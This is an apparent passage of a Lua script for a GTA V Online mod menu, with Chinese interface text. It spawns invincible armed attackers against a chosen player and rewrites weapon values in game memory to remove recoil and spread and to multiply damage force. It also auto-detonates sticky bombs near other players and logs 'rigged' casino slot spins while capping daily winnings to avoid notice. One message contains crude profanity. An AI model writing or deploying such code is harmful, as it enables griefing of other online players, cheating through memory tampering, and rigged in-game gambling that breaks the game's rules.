    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 1.0, 0.0, 500.0)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    request_model_load(vhash)
    request_model_load(phash)
    for i=1, num_attackers do
        coords.x = coords.x + i*2
        coords.y = coords.y + i*2
        local aircraft = entities.create_vehicle(vhash, coords, 0.0)
        VEHICLE.CONTROL_LANDING_GEAR(aircraft, 3)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(aircraft)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(aircraft, VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(aircraft))
        if godmodeatk then
            ENTITY.SET_ENTITY_INVINCIBLE(aircraft, true)
        end
        for i= -1, VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(vhash) - 2 do
            local ped = entities.create_ped(28, phash, coords, 30.0)
            if i == -1 then
                TASK.TASK_PLANE_MISSION(ped, aircraft, 0, target_ped, 0, 0, 0, 6, 0.0, 0, 0.0, 50.0, 40.0)
            end
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
            PED.SET_PED_INTO_VEHICLE(ped, aircraft, i)
            TASK.TASK_COMBAT_PED(ped, target_ped, 0, 16)
            PED.SET_PED_ACCURACY(ped, 100.0)
            PED.SET_PED_COMBAT_ABILITY(ped, 2)
        end
    end
end
function max_out_car(veh)
    for i=0, 49 do
        num = VEHICLE.GET_NUM_VEHICLE_MODS(veh, i)
        VEHICLE.SET_VEHICLE_MOD(veh, i, num -1, true)
    end
end
function send_groundv_attacker(vhash, phash, pid, givegun)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    request_model_load(vhash)
    local bike_hash = -159126838
    request_model_load(phash)
    for i=1, num_attackers do
        local spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, num_attackers-i, -10.0, 0.0)
        spawn_pos.x = spawn_pos['x']
        spawn_pos.y = spawn_pos['y']
        spawn_pos.z = spawn_pos['z']
        local bike = entities.create_vehicle(vhash, spawn_pos, ENTITY.GET_ENTITY_HEADING(player_ped))
        for i=-1, VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(vhash) - 2 do
            local rider = entities.create_ped(1, phash, spawn_pos, 0.0)
            if i == -1 then
                TASK.TASK_VEHICLE_CHASE(rider, target_ped)
            end
            max_out_car(atkbike)
            PED.SET_PED_INTO_VEHICLE(rider, bike, i)
            WEAPON.GIVE_WEAPON_TO_PED(rider, atkgun, 1000, false, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(rider, 5, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(rider, 46, true)
            TASK.TASK_COMBAT_PED(rider, player_ped, 0, 16)
            if godmodeatk then
                ENTITY.SET_ENTITY_INVINCIBLE(bike, true)
                ENTITY.SET_ENTITY_INVINCIBLE(rider, true)
            end
            if givegun then
                WEAPON.GIVE_WEAPON_TO_PED(rider, atkgun, 0, false, true)
            end
        end
    end
end
good_guns = {453432689, 171789620, 487013001, -1716189206, 1119849093}
local function getWeaponHash(ped)
    local wpn_ptr = memory.alloc_int()
    if WEAPON.GET_CURRENT_PED_VEHICLE_WEAPON(ped, wpn_ptr) then -- only returns true if the weapon is a vehicle weapon
        return memory.read_int(wpn_ptr), true
    end
    return WEAPON.GET_SELECTED_PED_WEAPON(ped), false
end
local function address_from_pointer_chain(address, offsets)
    local addr = address
    for k = 1, (#offsets - 1) do
        addr = memory.read_long(addr + offsets[k])
        if addr == 0 then
            return 0
        end
    end
    addr += offsets[#offsets]
    return addr
end
local function readWeaponAddress(storeTable, offset, stopIfModified)
    if util.is_session_transition_active() then return 0 end
    local userPed = players.user_ped()
    local weaponHash, vehicleWeapon = getWeaponHash(userPed)
    if stopIfModified and storeTable[weaponHash] then return 0 end
    local pointer = (vehicleWeapon and 0x70 or 0x20)
    local address = address_from_pointer_chain(entities.handle_to_pointer(userPed), {0x10B8, pointer, offset})
    if address == 0 then menu.toast('Failed to find memory address.') return 0 end
    if storeTable[weaponHash] == nil then
        storeTable[weaponHash] = {
            address = address,
            original = memory.read_float(address)
        }
    end
    return weaponHash
end
function resetWeapons(modifiedWeapons)
    for hash, _ in pairs(modifiedWeapons) do
        memory.write_float(modifiedWeapons[hash].address, modifiedWeapons[hash].original)
        modifiedWeapons[hash] = nil
    end
end
--武器设置
modifiedRecoil = {}
function gunpro()
    local weaponHash = readWeaponAddress(modifiedRecoil, 0x2F4, true)
    if weaponHash == 0 then return end
    memory.write_float(modifiedRecoil[weaponHash].address, 0)
end
modifiedRange = {}
function maxrange()
    if util.is_session_transition_active() then return end
    local userPed = players.user_ped()
    local weaponHash, vehicleWeapon = getWeaponHash(userPed)
    if modifiedRange[weaponHash] then return end
    local pointer = (vehicleWeapon and 0x70 or 0x20)
    local userPedPointer = entities.handle_to_pointer(userPed)
    modifiedRange[weaponHash] = {
        minAddress   = address_from_pointer_chain(userPedPointer, {0x10B8, pointer, 0x298}),
        maxAddress   = address_from_pointer_chain(userPedPointer, {0x10B8, pointer, 0x29C}),
        rangeAddress = address_from_pointer_chain(userPedPointer, {0x10B8, pointer, 0x28C}),
    }
    if modifiedRange[weaponHash].minAddress == 0 or modifiedRange[weaponHash].maxAddress == 0 or modifiedRange[weaponHash].rangeAddress == 0 then menu.toast('Failed to find memory address.') return end
    modifiedRange[weaponHash].originalMin   = memory.read_float(modifiedRange[weaponHash].minAddress)
    modifiedRange[weaponHash].originalMax   = memory.read_float(modifiedRange[weaponHash].maxAddress)
    modifiedRange[weaponHash].originalRange = memory.read_float(modifiedRange[weaponHash].rangeAddress)
    memory.write_float(modifiedRange[weaponHash].minAddress,   150000)  --because the map is about 15km tall
    memory.write_float(modifiedRange[weaponHash].maxAddress,   150000)
    memory.write_float(modifiedRange[weaponHash].rangeAddress, 150000)
end
modifiedSpread = {}
function nospread()
    local weaponHash = readWeaponAddress(modifiedSpread, 0x74, true)
    if weaponHash == 0 then return end
    memory.write_float(modifiedSpread[weaponHash].address, 0)
end
modifiedSpinup = {
    [1] = {hash = util.joaat('weapon_minigun')},
    [2] = {hash = util.joaat('weapon_rayminigun')},
}
function nospinup()
    local weaponHash = WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
    for i = 1, #modifiedSpinup do
        if weaponHash == modifiedSpinup[i].hash then
            modifiedSpinup[i].address = address_from_pointer_chain(entities.handle_to_pointer(players.user_ped()), {0x10B8, 0x20, 0x144})
            if modifiedSpinup[i].address == 0 then return end
            memory.write_float(modifiedSpinup[i].address, 0)
        end
    end
end
modifiedCarForce = {}
modifiedHeliForce = {}
modifiedPedForce = {}
function damagemoded()
    local weaponHash = readWeaponAddress(modifiedCarForce, 0x0E0, false)
    if weaponHash == 0 then return end
    memory.write_float(modifiedCarForce[weaponHash].address, modifiedCarForce[weaponHash].original * 99999999999999)
    weaponHash = readWeaponAddress(modifiedHeliForce, 0x0E4, false)
    if weaponHash == 0 then return end
    memory.write_float(modifiedHeliForce[weaponHash].address, modifiedHeliForce[weaponHash].original * 99999999999999)
    weaponHash = readWeaponAddress(modifiedPedForce, 0x0DC, false)
    if weaponHash == 0 then return end
    memory.write_float(modifiedPedForce[weaponHash].address, modifiedPedForce[weaponHash].original * 99999999999999)
end
extraZoom2 = 0
modifiedAimFov = {}
---@diagnostic disable-next-line: undefined-global
function gunzoom()
    K.disable_control_action(0, 'INPUT_SNIPER_ZOOM_IN_ONLY')
        K.disable_control_action(0, 'INPUT_SNIPER_ZOOM_OUT_ONLY')
        if not K.is_control_pressed(0, 'INPUT_AIM') then
            extraZoom2 = 0
            return
        end
        local step = if extraZoom2 > 60 or extraZoom2 < -5 then 3 else 6 end
        if not (extraZoom2 <= -35) and K.is_disabled_control_just_pressed(0, 'INPUT_SNIPER_ZOOM_IN_ONLY') then
            extraZoom2 -= step
        elseif not (extraZoom2 >= 100) and K.is_disabled_control_just_pressed(0, 'INPUT_SNIPER_ZOOM_OUT_ONLY') then
            extraZoom2 += step
        end
        local weaponHash = readWeaponAddress(modifiedAimFov, 0x2FC, false)
        if weaponHash == 0 then return end
        memory.write_float(modifiedAimFov[weaponHash].address, modifiedAimFov[weaponHash].original + extraZoom2)
end
extraZoom = 0
modifiedZoomFov = {}
function enablezoomfov()
    local weaponHash = readWeaponAddress(modifiedZoomFov, 0x410, false)
    if weaponHash == 0 then return end
    memory.write_float(modifiedZoomFov[weaponHash].address,  modifiedZoomFov[weaponHash].original + extraZoom)
end
function zoomaimfov(value)
    extraZoom = (value - 100) / 100
    modifiedZoomWeapon = nil
end
local STOREDIR = filesystem.scripts_dir() .. "/lib/" .. '/GTlib/' .. '/GTW/'
local LIBDIR = filesystem.scripts_dir() .. "lib\\GTlib\\"
do_autoload = false
local wpcmpTable = {}
local weapons_table = {}
if filesystem.exists(LIBDIR .. "R.lua") then
    wpcmpTable = require("lib.GTlib.R")
    weapons_table = util.get_weapons()
else
    gtoast("您没有正确安装资源。\n确保组件资源lua在 " .. LIBDIR .. " directory")
    util.stop_script()
end
local attachments_dict = wpcmpTable[1]
local liveries_dict = wpcmpTable[2]
function Save_Weapon_Profile()
    local charS,charE = "   ","\n"
    local player = players.user_ped()
    file = io.open(STOREDIR .. "loadout.lua", "wb")
    file:write("return {" .. charE)
    local num_weapons = 0
    for _, weapon in weapons_table do
        local weapon_hash = weapon.hash
        if WEAPON.HAS_PED_GOT_WEAPON(player, weapon_hash, false) then
            num_weapons = num_weapons + 1
            if num_weapons > 1 then
                file:write("," .. charE)
            end
            file:write(charS .. "[" .. weapon_hash .. "] = ")
            --WEAPON.SET_CURRENT_PED_WEAPON(player, weapon_hash, true)
            local num_attachments = 0
            for attachment_hash, _ in attachments_dict do
                if (WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, attachment_hash)) then
                    --wait(10)
                    if WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(player, weapon_hash, attachment_hash) then
                        num_attachments = num_attachments + 1
                        if num_attachments == 1 then
                            file:write("{")
                            file:write(charE .. charS .. charS .. "[\"attachments\"] = {")
                        else
                            file:write(",")
                        end
                        file:write(charE .. charS .. charS .. charS .. "[" .. num_attachments .. "] = " .. attachment_hash)
                    end
                end
            end
            local cur_tint = WEAPON.GET_PED_WEAPON_TINT_INDEX(player, weapon_hash)
            if num_attachments > 0 then
                file:write(charE .. charS .. charS .. "},")
            else
                file:write("{")
            end
            file:write(charE .. charS .. charS .. "[\"tint\"] = " .. cur_tint)
            --- Livery
            for livery_hash, _ in liveries_dict do
                if WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(player, weapon_hash, livery_hash) then
                    local colour = WEAPON.GET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery_hash)
                    file:write("," .. charE .. charS .. charS .. "[\"livery\"] = {")
                    file:write(charE .. charS .. charS .. charS .. "[\"hash\"] = " .. livery_hash .. ",")
                    file:write(charE .. charS .. charS .. charS .. "[\"colour\"] = " .. colour)
                    file:write(charE .. charS .. charS .. "}")
                    break
                end
            end
            file:write(charE .. charS .. "}")
        end
    end
    file:write(charE .. "}")
    file:close()
    gtoast("保存完成了！")
end
function Load_Out_Weapon()
    if filesystem.exists(STOREDIR .. "loadout.lua") then
        player = players.user_ped()
        WEAPON.REMOVE_ALL_PED_WEAPONS(player, false)
        WEAPON.SET_CAN_PED_SELECT_ALL_WEAPONS(player, true)
        local loadout = require("/lib/" .. '/GTlib/' .. '/GTW/' .. "loadout")
        for w_hash, attach_dict in loadout do
            WEAPON.GIVE_WEAPON_TO_PED(player, w_hash, 10, false, true)
            if attach_dict.attachments ~= nil then
                for _, hash in attach_dict.attachments do
                    WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(player, w_hash, hash)
                end
            end
            WEAPON.SET_PED_WEAPON_TINT_INDEX(player, w_hash, attach_dict["tint"])
            if attach_dict.livery ~= nil then
                WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(player, w_hash, attach_dict.livery.hash)
                WEAPON.SET_PED_WEAPON_COMPONENT_TINT_INDEX(player, w_hash, attach_dict.livery.hash, attach_dict.livery.colour)
            end
        end
        regen_menu()
        gtoast("配备装备")
        menu.trigger_commands("fillammo")
    else
        gtoast("你以前从未保存过，为什么要点这个选项 操你妈的 *.*")
    end
    package.loaded["store\\loadout"] = nil
end
function Auto_Load_Out_Weapon(on)
    do_autoload = on
end
function Dele_All_Weapon()
    WEAPON.REMOVE_ALL_PED_WEAPONS(players.user_ped(), false)
    regen_menu()
    gtoast("你的武器被人用了！")
end
function regen_menu()
    for _, weapon in weapons_table do
        if weapons_action[weapon.hash] ~= nil then
            if weapons_action[weapon.hash]:isValid() then
                weapons_action[weapon.hash]:delete()
            end
        end
    end
    weapons_action = {}
    attachments_action = {}
    weapon_deletes = {}
    cosmetics_list = {}
    tints_slider = {}
    livery_action_divider = {}
    livery_actions = {}
    livery_colour_slider = {}
    livery = {}
    for _, weapon in weapons_table do
        local category = weapon.category
        local weapon_name = util.get_label_text(weapon.label_key)
        local weapon_hash = weapon.hash
        if WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), weapon_hash, false) then
            generate_for_new_weapon(category, weapon_name, weapon_hash, false)
        else
            weapons_action[weapon_hash] = categories[category]:action(weapon_name .. " (未配备)", {}, "配备 " .. weapon_name,
                    function()
                        weapons_action[weapon_hash]:delete()
                        equip_weapon(category, weapon_name, weapon_hash)
                    end
            )
        end
        WEAPON.ADD_AMMO_TO_PED(players.user_ped(), weapon_hash, 10) --- if a special ammo type has been equipped.. it should get some ammo
    end
end
function equip_comp(category, weapon_name, weapon_hash, attachment_hash)
    WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(players.user_ped(), weapon_hash, attachment_hash)
end
function equip_weapon(category, weapon_name, weapon_hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), weapon_hash, 10, false, true)
    wait(10)
    weapon_deletes[weapon_name] = nil
    generate_for_new_weapon(category, weapon_name, weapon_hash, true)
end
function generate_for_new_weapon(category, weapon_name, weapon_hash, focus)
    weapons_action[weapon_hash] = categories[category]:list(weapon_name, {}, "编辑的附件 " .. weapon_name,
            function()
                WEAPON.SET_CURRENT_PED_WEAPON(players.user_ped(), weapon_hash, true)
                generate_attachments(category, weapon_name, weapon_hash)
            end
    )
    if focus then
        weapons_action[weapon_hash]:trigger()
    end
end
function generate_cosmetics(weapon_hash, weapon_name)
    -- clear old cosmetic stuff
    livery_action_divider = {}
    livery_colour_slider = {}
    livery = {}
    tints_slider = {}
    livery_actions = {}
    if cosmetics_list[weapon_hash] ~= nil then
        if cosmetics_list[weapon_hash]:isValid() then
            cosmetics_list[weapon_hash]:delete()
        end
        regenerated_cosmetics = true
    end
    cosmetics_list[weapon_hash] = weapons_action[weapon_hash]:list("表面", {}, "",
            function()
                local tint_count = WEAPON.GET_WEAPON_TINT_COUNT(weapon_hash)
                local cur_tint = WEAPON.GET_PED_WEAPON_TINT_INDEX(player, weapon_hash)
                if tints_slider[weapon_hash] == nil then
                    tints_slider[weapon_hash] = cosmetics_list[weapon_hash]:slider("色调", {}, "选择适合你的色调 " .. weapon_name, 0, tint_count - 1, cur_tint, 1,
                            function(change)
                                WEAPON.SET_PED_WEAPON_TINT_INDEX(player, weapon_hash, change)
                            end
                    )
                end
                --- livery colour
                local has_liveries = false
                for livery_hash, _ in liveries_dict do
                    if WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, livery_hash) then
                        has_liveries = true
                        break
                    end
                end
                if has_liveries then
                    --- get current camo component
                    for hash, _ in liveries_dict do
                        if WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(player, weapon_hash, hash) then
                            livery[weapon_hash] = hash
                            break
                        end
                    end
                    --- livery colour slider
                    if livery_colour_slider[weapon_hash] == nil then
                        local cur_ctint_colour = WEAPON.GET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery[weapon_hash])
                        if cur_ctint_colour == -1 then cur_ctint_colour = 0 end
                        livery_colour_slider[weapon_hash] = cosmetics_list[weapon_hash]:slider("皮肤颜色", {}, "改变你的皮肤颜色", 0, 31, cur_ctint_colour, 1,
                                function(index)
                                    if livery[weapon_hash] == nil then
                                        gtoast("你的武器上没有皮肤")
                                    else
                                        WEAPON.SET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery[weapon_hash], index)
                                    end
                                end
                        )
                    end
                    if livery_action_divider[weapon_hash] == nil then
                        livery_action_divider[weapon_hash] = cosmetics_list[weapon_hash]:divider("皮肤")
                    end
                    --- livery equip actions
                    for livery_hash, label in liveries_dict do
                        if WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, livery_hash) and livery_actions[weapon_hash..livery_hash] == nil then
                            livery_actions[weapon_hash .. livery_hash] = cosmetics_list[weapon_hash]:action(util.get_label_text(label), {}, "",
                                    function()
                                        livery[weapon_hash] = livery_hash
                                        equip_comp(category, weapon_name, weapon_hash, livery_hash)
                                        WEAPON.SET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery[weapon_hash], livery_colour_slider[weapon_hash].value)
                                    end
                            )
                        end
                    end
                end
            end
    )
end
function generate_attachments(category, weapon_name, weapon_hash)
    if weapon_deletes[weapon_name] == nil then
        weapon_deletes[weapon_name] = weapons_action[weapon_hash]:action("删去 " .. weapon_name, {}, "",
                function()
                    WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(), weapon_hash)
                    cosmetics_list[weapon_hash]:delete()
                    cosmetics_list[weapon_hash] = nil
                    livery_action_divider[weapon_hash] = nil
                    weapons_action[weapon_hash]:delete()
                    gtoast(weapon_name .. " 已删除")
                    weapons_action[weapon_hash] = categories[category]:action(weapon_name .. " (未配备)", {}, "配备 " .. weapon_name,
                            function()
                                for a_key, _ in attachments_action do
                                    if string.find(a_key, weapon_hash) ~= nil then
                                        attachments_action[a_key] = nil
                                    end
                                end
                                menu.delete(weapons_action[weapon_hash])
                                equip_weapon(category, weapon_name, weapon_hash)
                                weapon_deletes[weapon_name] = nil
                            end
                    )
                    weapons_action[weapon_hash]:focus()
                end
        )
    end
    local has_attachments = false
    for livery_hash, _ in attachments_dict do
        if WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, livery_hash) then
            has_attachments = true
            break
        end
    end
    if cosmetics_list[weapon_hash] == nil then
        generate_cosmetics(weapon_hash, weapon_name)
        if has_attachments then
            weapons_action[weapon_hash]:divider("附件")
        end
    end
    for attachment_hash, attachment_label in attachments_dict do
        local attachment_name = util.get_label_text(attachment_label)
        if (WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, attachment_hash)) then
            if (attachments_action[weapon_hash .. " " .. attachment_hash] ~= nil) then attachments_action[weapon_hash .. " " .. attachment_hash]:delete() end
            attachments_action[weapon_hash .. " " .. attachment_hash] = weapons_action[weapon_hash]:action(attachment_name, {}, "配备 " .. attachment_name .. " 在您的 " .. weapon_name,
                    function()
                        equip_comp(category, weapon_name, weapon_hash, attachment_hash)
                        if (string.find(attachment_label, "弹夹") ~= nil or string.find(attachment_label, "炮弹") ~= nil) and WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(players.user_ped(), weapon_hash, attachment_hash) then
                            WEAPON.ADD_AMMO_TO_PED(players.user_ped(), weapon_hash, 10)
                        end
                    end
            )
        end
    end
end
categories = {}
weapons_action = {}
attachments_action = {}
weapon_deletes = {}
cosmetics_list = {}
tints_slider = {}
livery_action_divider = {}
livery_actions = {}
livery_colour_slider = {}
livery = {}
function Weapon_Check_Save()
for _, weapon in weapons_table do
    local category = weapon.category
    if categories[category] == nil then
        categories[category] = custom_weapon_save:list(category, {}, "编辑的武器 " .. category .. " 类别")
    end
end
regen_menu()
end
proxyStickySettings = {players = true, npcs = false, radius = 2}
local function autoExplodeStickys(ped)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    if MISC.IS_PROJECTILE_TYPE_WITHIN_DISTANCE(pos.x, pos.y, pos.z, util.joaat('weapon_stickybomb'), proxyStickySettings.radius, true) then
        WEAPON.EXPLODE_PROJECTILES(players.user_ped(), util.joaat('weapon_stickybomb'))
    end
end
function proxyStickys()
    if proxyStickySettings.players then
        local specificWhitelistGroup = {user = false,  friends = whitelistGroups.friends, strangers = whitelistGroups.strangers}
        local playerList = getNonWhitelistedPlayers(whitelistListTable, specificWhitelistGroup, whitelistedName)
        for _, pid in pairs(playerList) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            autoExplodeStickys(ped)
        end
    end
    if proxyStickySettings.npcs then
        local pedHandles = entities.get_all_peds_as_handles()
        for _, ped in pairs(pedHandles) do
            if not PED.IS_PED_A_PLAYER(ped) then
                autoExplodeStickys(ped)
            end
        end
    end
end
function proxyStickys_players(toggle)
    proxyStickySettings.players = toggle
end
function proxystickys_npc(toggle)
    proxyStickySettings.npcs = toggle
end
function proxysticks_radius(value)
    proxyStickySettings.radius = value
end
------- 实体控制枪 -------
function entity_control_all(menu_parent, ent)
    menu.action(menu_parent, "检测该实体是否存在", {}, "", function()
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            gtoast("实体存在")
        else
            gtoast("该实体已经不存在，请删除此条实体记录！")
        end
    end)
    menu.action(menu_parent, "删除此条实体记录", {}, "", function()
        menu.delete(menu_parent)
        clearTableValue(control_ent_menu_list, menu_parent)
        clearTableValue(control_ent_list, ent)
    end)
    --- ---
    menu.divider(menu_parent, "Entity")
    menu.toggle(menu_parent, "无敌", {}, "", function(toggle)
        ENTITY.SET_ENTITY_INVINCIBLE(ent, toggle)
        ENTITY.SET_ENTITY_PROOFS(ent, toggle, toggle, toggle, toggle, toggle, toggle, toggle, toggle)
    end)
    menu.toggle(menu_parent, "冻结", {}, "", function(toggle)
        ENTITY.FREEZE_ENTITY_POSITION(ent, toggle)
    end)
    --- ---
    menu.divider(menu_parent, "血量")
    menu.action(menu_parent, "获取当前血量", {}, "", function()
        gtoast("当前血量: " .. ENTITY.GET_ENTITY_HEALTH(ent))
    end)
    local control_ent_health = 1000
    menu.slider(menu_parent, "血量", { "control_ent_health" }, "", 0, 30000, 1000, 100, function(value)
        control_ent_health = value
    end)
    menu.action(menu_parent, "设置血量", {}, "", function()
        ENTITY.SET_ENTITY_HEALTH(ent, control_ent_health)
    end)
    --- ---
    menu.divider(menu_parent, "移动")
    menu.click_slider(menu_parent, "前/后移动", {}, "", -100, 100, 0, 1, function(value)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ent, 0.0, value, 0.0)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)
    menu.click_slider(menu_parent, "左/右移动", {}, "", -100, 100, 0, 1, function(value)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ent, value, 0.0, 0.0)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)
    menu.click_slider(menu_parent, "上/下移动", {}, "", -100, 100, 0, 1, function(value)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ent, 0.0, 0.0, value)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)
    menu.click_slider(menu_parent, "朝向", {}, "", -360, 360, 0, 10, function(value)
        local head = ENTITY.GET_ENTITY_HEADING(ent)
        ENTITY.SET_ENTITY_HEADING(ent, head + value)
    end)
    --- ---
    menu.divider(menu_parent, "传送")
    menu.click_slider(menu_parent, "传送到我面前", {}, "", -10, 10, 2, 1, function(value)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, value, 0.0)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)
    menu.toggle_loop(menu_parent, "锁定传送在我头上", {}, "", function()
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 0.0, 2.0)
        ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
    end)
    menu.action(menu_parent, "离我的距离", {}, "", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local ent_pos = ENTITY.GET_ENTITY_COORDS(ent)
        gtoast(vect.dist(my_pos, ent_pos))
    end)
    menu.click_slider(menu_parent, "最大速度", { "control_ent_max_speed" }, "", 0.0, 1000.0, 30.0, 10.0, function(value)
        ENTITY.SET_ENTITY_MAX_SPEED(ent, value)
    end)
end
function IS_MPPLY(Stat)
    local Stats = {
        "MP_PLAYING_TIME",
        "MP_NGDLCPSTAT_INT0",
    }
    for i = 1, #Stats do
        if Stat == Stats[i] then
            return true
        end
    end
    if string.find(Stat, "MPPLY_") then
        return true
    else
        return false
    end
end
function ADD_MP_INDEX(Stat)
    if not IS_MPPLY(Stat) then
        Stat = "MP" .. util.get_char_slot() .. "_" .. Stat
    end
    return Stat
end
function STAT_GET_INT(Stat)
    local IntPTR = memory.alloc_int()
    STATS.STAT_GET_INT(util.joaat(ADD_MP_INDEX(Stat)), IntPTR, -1)
    return memory.read_int(IntPTR)
end
function get_chip_count()
    return STAT_GET_INT("CASINO_CHIPS")
end
function debug_log(message)
    if config.debug_mode then
        util.log("[SlotBot] "..message)
    end
end
function array_reverse(x)
    local n, m = #x, #x/2
    for i=1, m do
        x[i], x[n-i+1] = x[n-i+1], x[i]
    end
    return x
end
function press_button(button_id)
    for i = 1,10 do
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, button_id, 1)
        wait()
    end
end
function format_large_number(number)
    local i, j, minus, int, fraction = tostring(number):find('([-]?)(%d+)([.]?%d*)')
    -- reverse the int-string and append a comma to all blocks of 3 digits
    int = int:reverse():gsub("(%d%d%d)", "%1,")
    -- reverse the int-string back remove an optional comma and put the
    -- optional minus and fractional part back
    return minus .. int:reverse():gsub("^,", "") .. fraction
end
function count_wins(spin_log)
    local num_wins = 0
    local target_time = util.current_time_millis() - config.millis_in_day
    for _, spin in pairs(spin_log) do
        if spin.is_rigged and spin.time > target_time then
            num_wins = num_wins + 1
        end
    end
    return num_wins
end
function calculate_daily_winnings(spin_log)
    local daily_winnings = 0
    local target_time = util.current_time_millis() - config.millis_in_day
    for _, spin in pairs(spin_log) do
        if spin.is_rigged and spin.time > target_time and spin.winnings ~= nil and spin.winnings > 0 then
            daily_winnings = daily_winnings + (spin.winnings or 0)
        end
    end
    return daily_winnings
end
function disp_time(time)
    --local days = math.floor(time/86400)
    local hours = math.floor((time % 86400)/3600)
    local minutes = math.floor((time % 3600)/60)
    --local seconds = math.floor(time % 60)
    return string.format("%d:%02d",hours,minutes)
end
function is_player_within_dimensions(dimensions, pid)
    if pid == nil then pid = players.user_ped() end
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local player_pos = ENTITY.GET_ENTITY_COORDS(target_ped)
    return (
            player_pos.x > dimensions.min.x and player_pos.x < dimensions.max.x
                    and player_pos.y > dimensions.min.y and player_pos.y < dimensions.max.y
                    and player_pos.z > dimensions.min.z and player_pos.z < dimensions.max.z
    )
end
function is_player_in_casino(pid)
    return is_player_within_dimensions({
        min={
            x=1073.9967,
            y=189.58717,
            z=-53.838943,
        },
        max={
            x=1166.935,
            y=284.88977,
            z=-42.28554,
        },
    }, pid)
end
function is_player_near_slot_machine(slot_machine_position, sensitivty)
    if sensitivty == nil then sensitivty = 1 end
    return is_player_within_dimensions({
        min={
            x=slot_machine_position.x - sensitivty,
            y=slot_machine_position.y - sensitivty,
            z=slot_machine_position.z - sensitivty,
        },
        max={
            x=slot_machine_position.x + sensitivty,
            y=slot_machine_position.y + sensitivty,
            z=slot_machine_position.z + sensitivty,
        },
    }, players.user())
end
function is_player_at_any_slot_machine()
    for _, slot_machine_position in pairs(slot_machine_positions) do
        if is_player_near_slot_machine(slot_machine_position.seated, 0.3) then
            return true
        end
    end
    return false
end
function load_spin_log()
    local file = io.open(SPIN_LOG_FILE)
    if not file then
        debug_log("Trying legacy spin log file")
        file = io.open(LEGACY_SPIN_LOG_FILE)
    end
    if file then
        local version = file:read()
        file:close()
        local spin_log_status, spin_log = pcall(soup.json.decode, version)
        if not spin_log_status then
            error("Could not decode spin log file")
        end
        return spin_log
    else
        return {}
    end
end
function log_spin(is_rigged, spin_winnings)
    debug_log("Logging spin")
    local spin_log = load_spin_log()
    local num_wins = count_wins(spin_log)
    if num_wins == 0 and #spin_log > 0 then spin_log = {} end
    table.insert(spin_log, {
        is_rigged=is_rigged,
        time=util.current_time_millis(),
        winnings=spin_winnings,
        log_time=os.date("%H:%M:%S")
    })
    save_spin_log(spin_log)
end
function get_daily_winnings()
    local spin_log = load_spin_log()
    return calculate_daily_winnings(spin_log)
end
function find_earliest_rigged_spin()
    local cutoff_time = util.current_time_millis() - config.millis_in_day
    local winnings = 0
    local spin_log = load_spin_log()
    for _, spin_log_item in pairs(array_reverse(spin_log)) do
        if spin_log_item.time > cutoff_time and spin_log_item.is_rigged then
            winnings = winnings + spin_log_item.winnings
            if winnings > config.max_daily_winnings then
                return spin_log_item
            end
        end
    end
end
function find_first_spin()
    local cutoff_time = util.current_time_millis() - config.millis_in_day
    local spin_log = load_spin_log()
    for _, spin_log_item in pairs(spin_log) do
        if spin_log_item.time > cutoff_time and spin_log_item.is_rigged then
            return spin_log_item
        end
    end
end
